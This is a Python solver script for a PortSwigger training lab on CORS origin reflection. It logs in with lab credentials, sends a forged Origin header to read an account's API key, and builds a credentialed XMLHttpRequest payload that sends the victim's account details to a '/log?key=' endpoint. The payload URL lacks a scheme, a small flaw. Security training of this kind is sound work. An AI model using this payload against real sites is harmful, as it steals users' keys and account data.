"""
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

site_url = f'https://{site}'
login_url = f"https://{site}/login"
login_response = s.get(login_url)
csrf = BeautifulSoup(login_response.text,'html.parser').find('input', {'name':'csrf'})['value']

login_data = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter'
}

resp = s.post(login_url,data=login_data)

s.headers.update({'Origin':'https://baa.com'})

details_url = f"https://{site}/accountDetails"
resp = s.get(details_url)

# View the response headers showing the Origin is echoed
print(resp.headers)

# Get the response containing the API key
print(resp.text)

exploit_html = f'''<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','{site}/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {{
       location='/log?key='+this.responseText;
   }};
</script>'''

